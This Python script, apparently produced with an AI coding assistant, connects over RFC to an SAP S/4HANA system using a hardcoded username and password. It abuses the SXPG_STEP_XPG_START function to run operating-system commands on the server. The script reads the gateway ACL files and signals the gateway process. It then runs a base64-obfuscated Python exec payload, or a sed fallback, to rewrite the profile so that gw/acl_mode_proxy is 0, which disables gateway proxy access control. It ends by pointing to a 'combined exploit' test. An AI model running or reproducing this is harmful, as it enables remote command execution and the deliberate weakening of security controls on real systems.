#!/usr/bin/env python3
"""Send SIGHUP to GW to reload prxyinfo/secinfo, then test SAPXPG."""
import sys, time
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK_PATH = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST='192.168.2.209'; SYSNR='00'; CLIENT='001'; USER='joris'; PASSWD='Schaap123!'

BASE = dict(TARGET="", DESTINATION="", STDINCNTL="R", STDOUTCNTL="M",
            STDERRCNTL="M", TRACECNTL="0", TERMCNTL="C", TRACELEVEL="0",
            LONG_PARAMS="", CONNCNTL="H")

def sxpg(conn, prog, params, label):
    print(f"\n[CMD] {label}: {prog} {params}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try:   r = conn.call("SXPG_STEP_XPG_START", MXROW=9999, **kw)
        except Exception as e:
            if "MXROW" in str(e) or "RFC_INVALID" in str(e):
                r = conn.call("SXPG_STEP_XPG_START", **kw)
            else:
                print(f"  ERROR: {e}"); return
    except Exception as e:
        print(f"  ERROR: {e}"); return
    for row in r.get("LOG", []):
        line = (row.get("MESSAGE") or row.get("LINE") or row.get("TEXT") or "") if isinstance(row, dict) else str(row)
        line = line.rstrip()
        if line: print(f"  {line}")
    print(f"  [exit={r.get('STATUS','?')!r}]")

def main():
    print(f"[*] Connecting...")
    with RFCConnection(sdk_path=SDK_PATH, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang="EN") as conn:
        print("[+] OK")

        # Verify prxyinfo and secinfo are in place
        sxpg(conn, "/usr/bin/cat", "/usr/sap/S4H/SYS/global/prxyinfo",
             "Current prxyinfo")
        sxpg(conn, "/usr/bin/cat", "/usr/sap/S4H/SYS/global/secinfo",
             "Current secinfo")

        # Check current gw/reg_no_conn_info value (user said they changed it to 1)
        sxpg(conn, "/usr/bin/grep",
             "gw/reg_no_conn_info /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
             "Current gw/reg_no_conn_info in DEFAULT.PFL")

        # Send SIGHUP to GW process (PID 94574) to reload ACL files
        # kill -HUP <pid>
        sxpg(conn, "/bin/kill", "-HUP 94574",
             "SIGHUP to GW pid 94574")

        # Also send to gwrd via pgrep
        sxpg(conn, "/usr/bin/pkill", "-HUP -f gwrd",
             "SIGHUP to gwrd process")

        # Wait and check GW log
        time.sleep(3)
        sxpg(conn, "/usr/bin/tail", "-20 /usr/sap/S4H/D00/work/gw_log-2026-04-11",
             "GW log after reload")

        # Check if gw/acl_mode_proxy is still 1 - we need to also handle this
        # With prxyinfo file present and permissive, even acl_mode_proxy=1 should allow all
        # But default.pfl still has acl_mode_proxy=1 - let's patch it a shorter way
        # gw/acl_mode_proxy = 1 → gw/acl_mode_proxy = 0 using sed via python
        import base64
        short_code = "import subprocess;subprocess.run(['/bin/sed','-i','s/gw\\/acl_mode_proxy = 1/gw\\/acl_mode_proxy = 0/g','/usr/sap/S4H/SYS/profile/DEFAULT.PFL'])"
        b64 = base64.b64encode(short_code.encode()).decode()
        # Short enough? b64 length:
        print(f"  [base64 len={len(b64)}]")
        if len(b64) < 200:
            sxpg(conn, "/usr/bin/python3",
                 f"-c exec(__import__('base64').b64decode('{b64}').decode())",
                 "Patch acl_mode_proxy=0 in DEFAULT.PFL")
        else:
            # Use sed directly with escaped forward slashes
            sxpg(conn, "/usr/bin/sed",
                 "-i s/gw\\/acl_mode_proxy\\ =\\ 1/gw\\/acl_mode_proxy\\ =\\ 0/g /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
                 "Patch acl_mode_proxy=0 via sed")

        sxpg(conn, "/usr/bin/grep",
             "gw/acl_mode /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
             "Verify DEFAULT.PFL after patch")

        print("\n[*] Done. Now run test_combined_exploit.py to test SAPXPG.")

if __name__ == '__main__':
    main()
